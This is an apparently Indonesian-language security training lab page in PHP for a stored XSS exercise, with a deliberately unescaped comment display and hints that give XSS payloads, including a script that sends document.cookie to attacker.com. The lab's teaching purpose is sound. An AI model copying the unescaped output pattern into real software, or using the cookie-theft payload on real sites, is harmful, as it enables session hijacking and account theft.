<?php
$active = 'basic-2';
require_once '../includes/db.php';
$conn = getDB();
$msg = ''; $mtype = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $author  = $_POST['author']  ?? '';
    $content = $_POST['content'] ?? '';

    if ($author !== '' && $content !== '') {
        // VULNERABLE: input langsung disimpan tanpa sanitasi
        $stmt = $conn->prepare("INSERT INTO comments (author, content) VALUES (?, ?)");
        $stmt->bind_param('ss', $author, $content);
        $stmt->execute();
        $msg   = "Komentar berhasil disimpan.";
        $mtype = 'ok';
    } else {
        $msg   = "Nama dan komentar tidak boleh kosong.";
        $mtype = 'warn';
    }
}

$comments = [];
$res = $conn->query("SELECT id, author, content, created_at FROM comments ORDER BY id DESC");
while ($row = $res->fetch_assoc()) $comments[] = $row;
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Basic 2: Stored XSS — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Basic 2: Stored XSS</span></div>
    <h1>Stored XSS <span class="tag o">BASIC 2</span></h1>
    <p class="phdr-desc">Payload disimpan di database melalui form komentar dan dieksekusi setiap kali halaman dibuka oleh siapapun. Ini adalah bentuk XSS yang paling berbahaya.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Sisipkan XSS payload pada field komentar yang tersimpan di database</span></li>
      <li><div class="obj-n">2</div><span>Pastikan payload dieksekusi secara otomatis setiap kali halaman dibuka</span></li>
      <li><div class="obj-n">3</div><span>Buat payload yang mengirimkan <code class="ic">document.cookie</code> ke URL eksternal (simulasi exfiltration)</span></li>
      <li><div class="obj-n">4</div><span>Pahami perbedaan antara Stored XSS dan Reflected XSS dari sisi dampak</span></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Vulnerability Context</div>
    <p class="prose" style="margin-bottom:12px">
      Komentar disimpan ke database lalu ditampilkan kembali menggunakan:
    </p>
    <div class="qbox"><div class="ql">Vulnerable PHP Code</div><span class="cm">// Saat menyimpan — tidak ada sanitasi</span>
<span class="kw">INSERT INTO</span> comments (author, content) <span class="kw">VALUES</span> (<span class="val">$author</span>, <span class="val">$content</span>);

<span class="cm">// Saat menampilkan — tidak ada encoding</span>
<span class="kw">echo</span> <span class="val">$row</span>[<span class="str">'content'</span>];</div>
    <p class="prose">Payload yang disimpan akan dieksekusi oleh <strong>setiap pengunjung</strong> yang membuka halaman ini — bukan hanya attacker.</p>
  </div>

  <!-- Komentar form -->
  <div class="box">
    <div class="box-t">Tambah Komentar</div>
    <?php if($msg): ?><div class="alert a-<?= $mtype ?>"><?= htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') ?></div><?php endif; ?>
    <form method="POST" action="/basic-2/">
      <div class="fg">
        <label class="fl">Nama</label>
        <input class="fi" type="text" name="author" placeholder="Nama kamu">
      </div>
      <div class="fg">
        <label class="fl">Komentar <span style="color:var(--red);font-size:.65rem">(VULNERABLE FIELD)</span></label>
        <textarea class="fi" name="content" rows="4" placeholder="Tulis komentar... atau XSS payload"></textarea>
      </div>
      <button type="submit" class="btn btn-r">Kirim Komentar</button>
    </form>
  </div>

  <!-- Komentar tersimpan -->
  <div class="box">
    <div class="box-t">Komentar &mdash; <?= count($comments) ?> post(s)</div>
    <?php if (empty($comments)): ?>
      <p style="font-size:.84rem;color:var(--t3);text-align:center;padding:20px 0">Belum ada komentar.</p>
    <?php else: ?>
      <?php foreach ($comments as $c): ?>
      <div class="comment-card">
        <div class="comment-author">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
          <?= htmlspecialchars($c['author'], ENT_QUOTES, 'UTF-8') ?>
          <span style="color:var(--t3);font-weight:400">&mdash; <?= $c['created_at'] ?></span>
        </div>
        <!-- VULNERABLE: content tidak di-escape -->
        <div class="comment-body"><?= $c['content'] ?></div>
      </div>
      <?php endforeach; ?>
    <?php endif; ?>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>

    <details class="hint">
      <summary>Hint 1 &mdash; Uji apakah HTML dirender</summary>
      <div class="hint-body">
        Kirim komentar dengan isi: <code class="ic">&lt;b&gt;hello&lt;/b&gt;</code><br>
        Jika teks tampil bold, field ini tidak di-sanitasi dan rentan terhadap Stored XSS.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 2 &mdash; Payload persistent</summary>
      <div class="hint-body">
        Kirim komentar dengan payload:<br>
        <code class="ic">&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code><br>
        Refresh halaman — alert akan muncul lagi tanpa perlu mengirim ulang.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 3 &mdash; Simulasi cookie exfiltration</summary>
      <div class="hint-body">
        Payload untuk mengirim cookie ke server eksternal (simulasi):<br>
        <code class="ic">&lt;script&gt;new Image().src='http://attacker.com/log?c='+document.cookie&lt;/script&gt;</code><br>
        Ganti <code class="ic">attacker.com</code> dengan server yang kamu kontrol untuk melihat request masuk.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 4 &mdash; Stored vs Reflected</summary>
      <div class="hint-body">
        <strong style="color:var(--t1)">Reflected XSS:</strong> Korban harus mengklik link berbahaya. Payload tidak tersimpan.<br>
        <strong style="color:var(--t1)">Stored XSS:</strong> Payload tersimpan di server. Setiap user yang membuka halaman otomatis menjadi korban tanpa perlu interaksi attacker.
      </div>
    </details>
  </div>

</div>
<?php include '../includes/footer.php'; ?>
</body>
</html>
